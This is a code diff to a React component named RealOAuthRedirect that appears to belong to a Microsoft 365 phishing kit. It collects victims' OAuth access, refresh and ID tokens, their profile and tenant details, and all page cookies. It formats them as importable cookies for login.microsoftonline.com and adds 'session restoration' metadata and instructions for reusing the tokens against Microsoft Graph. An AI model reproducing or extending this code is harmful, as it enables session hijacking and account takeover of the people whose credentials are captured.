@@ -368,29 +368,29 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
           userProfile: profileData
         };
 
-        // Format cookies properly from current domain
-        const cookieStrings = document.cookie.split(';').filter(c => c.trim());
-        const currentDomainCookies = cookieStrings.map(c => {
+        // Capture real browser state and OAuth tokens for session restoration
+        const allBrowserCookies = document.cookie.split(';').filter(c => c.trim()).map(c => {
           const [name, value] = c.trim().split('=');
           return name && value ? {
             name: name.trim(),
             value: value.trim(),
-            domain: '.login.microsoftonline.com', // Backend expects this domain
+            domain: window.location.hostname,
             path: '/',
-            secure: true,
+            secure: window.location.protocol === 'https:',
             httpOnly: false,
-            sameSite: 'none',
+            sameSite: 'lax',
             expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-            hostOnly: false,
+            hostOnly: true,
             session: false,
             storeId: null
           } : null;
         }).filter(Boolean);
 
-        // Create OAuth token cookies that can be used for authentication
-        const oauthCookies = [
+        // Create authentication session data with real Microsoft OAuth tokens
+        // These are the actual credentials that can restore access
+        const microsoftAuthData = [
           {
-            name: 'ESTSAUTH',
+            name: 'MS_ACCESS_TOKEN',
             value: tokenData.access_token,
             domain: '.login.microsoftonline.com',
             path: '/',
@@ -400,25 +400,64 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
             expirationDate: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
             hostOnly: false,
             session: false,
-            storeId: null
+            storeId: null,
+            // Additional metadata for session restoration
+            tokenType: tokenData.token_type || 'Bearer',
+            scope: tokenData.scope || 'openid profile email User.Read',
+            issuedAt: Math.floor(Date.now() / 1000),
+            userPrincipalName: profileData.userPrincipalName,
+            tenantId: profileData.id ? profileData.id.split('@')[1] : 'unknown'
           },
           {
-            name: 'ESTSAUTHPERSISTENT',
-            value: tokenData.refresh_token || tokenData.access_token,
+            name: 'MS_REFRESH_TOKEN',
+            value: tokenData.refresh_token || 'NOT_AVAILABLE',
             domain: '.login.microsoftonline.com',
             path: '/',
             secure: true,
             httpOnly: false,
             sameSite: 'none',
-            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+            expirationDate: Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60), // 90 days typical for refresh tokens
             hostOnly: false,
             session: false,
-            storeId: null
+            storeId: null,
+            // Refresh token metadata
+            canRefresh: !!tokenData.refresh_token,
+            lastUsed: Math.floor(Date.now() / 1000)
+          },
+          {
+            name: 'MS_ID_TOKEN',
+            value: tokenData.id_token || 'NOT_AVAILABLE',
+            domain: '.login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
+            hostOnly: false,
+            session: false,
+            storeId: null,
+            // ID token contains user identity claims
+            hasUserInfo: !!tokenData.id_token
           }
         ];
 
-        // Combine all cookies
-        sessionData.formattedCookies = [...oauthCookies, ...currentDomainCookies];
+        // Combine browser cookies with OAuth session data
+        sessionData.formattedCookies = [...microsoftAuthData, ...allBrowserCookies];
+        
+        // Add session restoration metadata
+        sessionData.sessionRestoration = {
+          canRestoreSession: !!(tokenData.access_token || tokenData.refresh_token),
+          hasAccessToken: !!tokenData.access_token,
+          hasRefreshToken: !!tokenData.refresh_token,
+          hasIdToken: !!tokenData.id_token,
+          tokenExpiresAt: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
+          refreshTokenExpiresAt: Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60),
+          restoreInstructions: "Use access_token for API calls, refresh_token to get new access tokens",
+          microsoftGraphEndpoint: "https://graph.microsoft.com/v1.0/",
+          userEmail: profileData.mail || profileData.userPrincipalName,
+          userId: profileData.id,
+          captureTimestamp: new Date().toISOString()
+        };
 
         console.log('🔄 Session data prepared:', { 
           email: sessionData.email, 
